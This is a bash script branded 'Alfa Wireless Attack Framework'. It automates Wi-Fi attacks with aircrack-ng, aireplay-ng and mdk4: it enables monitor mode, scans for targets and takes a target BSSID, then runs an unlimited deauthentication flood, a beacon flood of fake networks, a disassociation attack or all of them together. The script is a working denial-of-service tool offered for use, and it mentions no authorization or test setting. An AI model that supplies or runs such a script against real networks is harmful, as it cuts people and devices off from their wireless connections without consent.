#!/bin/bash

title="\e[1;32m╔════════════════════════════════════════════╗
║      Alfa Wireless Attack Framework        ║
║           by Yassin | Pro Edition          ║
╚════════════════════════════════════════════╝\e[0m"

echo -e "$title"

# Check dependencies
for tool in aircrack-ng mdk4 xterm iw; do
    if ! command -v $tool &> /dev/null; then
        echo -e "\e[1;31m[!] Tool missing: $tool\e[0m"
        exit 1
    fi
done

# Detect interfaces
echo -e "\n[*] Detecting wireless interfaces..."
interfaces=$(iw dev | grep Interface | awk '{print $2}')

if [[ -z "$interfaces" ]]; then
    echo -e "\e[1;31m[!] No Wi-Fi interfaces found.\e[0m"
    exit 1
fi

i=1
echo "$interfaces" | while read -r intf; do
    echo "  [$i] $intf"
    let i++
done

read -p "[?] Select interface number: " choice
iface=$(echo "$interfaces" | sed -n "${choice}p")

echo -e "\n[+] Selected interface: \e[1;34m$iface\e[0m"

# Kill interfering services
airmon-ng check kill &> /dev/null

# Enable monitor mode
airmon-ng start $iface &> /dev/null
iface="${iface}mon"
echo -e "[+] Monitor mode enabled: $iface"

# Scan networks
echo -e "\n[*] Scanning for targets (press Ctrl+C to stop)..."
xterm -hold -e "airodump-ng $iface" &

read -p "[?] Enter BSSID (target MAC): " bssid
read -p "[?] Enter channel: " channel

iwconfig $iface channel $channel

# Choose attack type
echo -e "\n[1] Deauth (Kick devices)"
echo -e "[2] Beacon Flood (Fake networks)"
echo -e "[3] Disassociation (Disable AP)"
echo -e "[4] Combo Attack (All)"
read -p "[?] Choose attack type: " atk

log_file="attack_log_$(date +%H%M%S).log"
touch $log_file

case $atk in
  1)
    echo -e "[*] Running Deauth Attack on $bssid..."
    xterm -hold -e "aireplay-ng --deauth 0 -a $bssid $iface | tee $log_file"
    ;;
  2)
    echo -e "[*] Running Beacon Flood..."
    mdk4 $iface b -s 100 -f fakeaps.txt | tee $log_file
    ;;
  3)
    echo -e "[*] Running Disassociation Attack..."
    echo "$bssid" > dislist.txt
    mdk4 $iface d -b dislist.txt -c $channel | tee $log_file
    ;;
  4)
    echo -e "[*] Running Combo Attack on $bssid..."
    xterm -e "aireplay-ng --deauth 0 -a $bssid $iface" &
    sleep 1
    echo "$bssid" > dislist.txt
    mdk4 $iface d -b dislist.txt -c $channel | tee $log_file
    ;;
  *)
    echo -e "\e[1;31m[!] Invalid choice.\e[0m"
    ;;
esac

echo -e "\n[✓] Attack finished. Log saved to $log_file"

# Cleanup (optional)
read -p "[?] Disable monitor mode? (y/n): " clean
if [[ $clean == "y" ]]; then
    airmon-ng stop $iface
    service NetworkManager restart
    echo -e "[*] Restored interface and services."
fi
